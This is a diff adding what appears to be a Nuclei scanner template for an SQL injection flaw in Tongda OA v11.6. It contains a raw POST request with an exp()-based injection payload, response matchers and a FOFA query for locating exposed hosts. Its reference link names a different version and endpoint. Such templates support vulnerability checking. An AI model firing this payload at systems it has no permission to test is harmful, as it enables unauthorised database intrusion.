@@ -1,0 +1,37 @@
+id: poc-local-oa-tongda-v11_6-insert-SQLinject
+
+info:
+  name: 通达OA v11.6 insert SQL注入漏洞
+  author: capiton
+  severity: high
+  description: 通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20swfupload_new.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    Vulnerability-Impact: 通达OA v11.6
+  tags: tongda
+
+requests:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+
+    redirects: false        
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 302
+
+      - type: word
+        part: header
+        condition: and   
+        words:  
+          - "recv/register/register_for"
